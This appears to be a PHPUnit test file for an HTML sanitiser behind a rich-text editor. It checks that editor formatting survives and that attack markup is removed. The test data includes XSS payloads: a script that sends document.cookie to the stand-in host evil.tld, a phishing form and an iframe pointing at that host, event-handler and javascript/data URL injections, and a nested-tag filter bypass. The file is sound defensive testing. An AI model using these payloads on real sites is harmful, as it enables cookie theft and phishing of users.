<?php

namespace Tests\Unit\Actions;

use App\Actions\SanitiseRichText;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

class SanitiseRichTextTest extends TestCase
{
    private SanitiseRichText $action;

    protected function setUp(): void
    {
        parent::setUp();

        $this->action = new SanitiseRichText;
    }

    /**
     * Markup the TipTap toolbar can actually create. These matter as much as
     * the attack cases: a tightened allowlist silently strips formatting an
     * admin already saved, and nothing would tell them it happened.
     *
     * @return array<string, list<string>>
     */
    public static function editorMarkupProvider(): array
    {
        return [
            'paragraph' => ['<p>Meet at the north entrance.</p>', 'Meet at the north entrance.'],
            'bold' => ['<p><strong>Bring the key</strong></p>', '<strong>'],
            'italic' => ['<p><em>usually</em></p>', '<em>'],
            'strikethrough' => ['<p><s>Old spot</s></p>', '<s>'],
            'bullet list' => ['<ul><li>Keys</li></ul>', '<ul>'],
            'ordered list' => ['<ol><li>Collect</li></ol>', '<ol>'],
            'heading' => ['<h3>Parking</h3>', '<h3>'],
            'line break' => ['<p>Level 1<br>Rear door</p>', '<br'],
            'blockquote' => ['<blockquote><p>Note</p></blockquote>', '<blockquote>'],
            'horizontal rule' => ['<hr>', '<hr'],
            'code' => ['<p><code>Gate 4</code></p>', '<code>'],
        ];
    }

    #[DataProvider('editorMarkupProvider')]
    public function test_it_keeps_markup_the_editor_produces(string $html, string $expected): void
    {
        $this->assertStringContainsString($expected, $this->action->execute($html));
    }

    public function test_it_keeps_the_alignment_the_editor_writes_as_an_inline_style(): void
    {
        $result = $this->action->execute('<p style="text-align: center">Centre</p>');

        $this->assertStringContainsString('text-align', $result);
        $this->assertStringContainsString('Centre', $result);
    }

    /**
     * @return array<string, list<string>>
     */
    public static function allowedSchemeProvider(): array
    {
        return [
            'https' => ['https://example.org'],
            'http' => ['http://example.org'],
            'mailto' => ['mailto:coordinator@example.org'],
            'tel' => ['tel:+61312345678'],
            'sms' => ['sms:+61312345678'],
        ];
    }

    #[DataProvider('allowedSchemeProvider')]
    public function test_it_keeps_links_using_a_scheme_the_editor_offers(string $href): void
    {
        $result = $this->action->execute(sprintf('<a href="%s">Contact</a>', $href));

        $this->assertStringContainsString('<a ', $result);
        $this->assertStringContainsString('href', $result);
        $this->assertStringContainsString('Contact', $result);
    }

    public function test_it_forces_rel_on_links_so_a_new_tab_cannot_reach_the_opener(): void
    {
        $result = $this->action->execute('<a href="https://example.org" target="_blank">Map</a>');

        $this->assertStringContainsString('noopener', $result);
    }

    public function test_it_drops_a_script_tag_and_its_contents(): void
    {
        $result = $this->action->execute('<p>Hi</p><script>fetch("//evil.tld?c="+document.cookie)</script>');

        $this->assertStringContainsString('Hi', $result);
        $this->assertStringNotContainsString('script', $result);
        $this->assertStringNotContainsString('fetch', $result);
    }

    /**
     * @return array<string, list<string>>
     */
    public static function eventHandlerProvider(): array
    {
        return [
            'onclick' => ['onclick'],
            'onerror' => ['onerror'],
            'onload' => ['onload'],
            'onmouseover' => ['onmouseover'],
            'onfocus' => ['onfocus'],
        ];
    }

    #[DataProvider('eventHandlerProvider')]
    public function test_it_strips_event_handlers(string $attribute): void
    {
        $result = $this->action->execute(sprintf('<p %s="alert(1)">Text</p>', $attribute));

        $this->assertStringNotContainsString($attribute, $result);
        $this->assertStringContainsString('Text', $result);
    }

    /**
     * @return array<string, list<string>>
     */
    public static function dangerousSchemeProvider(): array
    {
        return [
            'javascript' => ['javascript:alert(1)', 'javascript:'],
            'data' => ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'data:'],
            'vbscript' => ['vbscript:msgbox(1)', 'vbscript:'],
        ];
    }

    #[DataProvider('dangerousSchemeProvider')]
    public function test_it_drops_links_using_a_scheme_the_editor_cannot_produce(string $href, string $needle): void
    {
        $result = $this->action->execute(sprintf('<a href="%s">Click</a>', $href));

        $this->assertStringNotContainsStringIgnoringCase($needle, $result);
        // The text stays: the link is defused, not the sentence around it.
        $this->assertStringContainsString('Click', $result);
    }

    public function test_it_drops_an_image_carrying_a_handler(): void
    {
        $result = $this->action->execute('<img src=x onerror="alert(1)">');

        $this->assertStringNotContainsString('onerror', $result);
        $this->assertStringNotContainsString('<img', $result);
    }

    public function test_it_drops_an_iframe(): void
    {
        $this->assertStringNotContainsString('iframe', $this->action->execute('<iframe src="//evil.tld"></iframe>'));
    }

    public function test_it_drops_a_form_that_could_phish_inside_the_dashboard(): void
    {
        $result = $this->action->execute('<form action="//evil.tld"><input name="password"></form>');

        $this->assertStringNotContainsString('<form', $result);
        $this->assertStringNotContainsString('<input', $result);
    }

    public function test_it_drops_svg_wrapped_script(): void
    {
        $this->assertStringNotContainsString('alert', $this->action->execute('<svg><script>alert(1)</script></svg>'));
    }

    public function test_it_drops_a_style_element_that_could_hide_the_page(): void
    {
        $this->assertStringNotContainsString('display:none', $this->action->execute('<style>body{display:none}</style>'));
    }

    public function test_it_survives_a_payload_that_only_becomes_a_tag_once_unwrapped(): void
    {
        // A naive single-pass stripper turns this into `<script>` by removing
        // the inner pair. The sanitiser parses rather than pattern-matches.
        $result = $this->action->execute('<scr<script>ipt>alert(1)</scr</script>ipt>');

        $this->assertStringNotContainsString('<script', $result);
    }

    /**
     * @return array<string, list<string|null>>
     */
    public static function emptyValueProvider(): array
    {
        return [
            'null' => [null],
            'empty string' => [''],
            'whitespace' => ['   '],
        ];
    }

    #[DataProvider('emptyValueProvider')]
    public function test_it_returns_an_empty_value_untouched(?string $value): void
    {
        $this->assertSame($value, $this->action->execute($value));
    }

    public function test_it_leaves_plain_text_alone(): void
    {
        $this->assertStringContainsString('Just a note', $this->action->execute('Just a note'));
    }
}
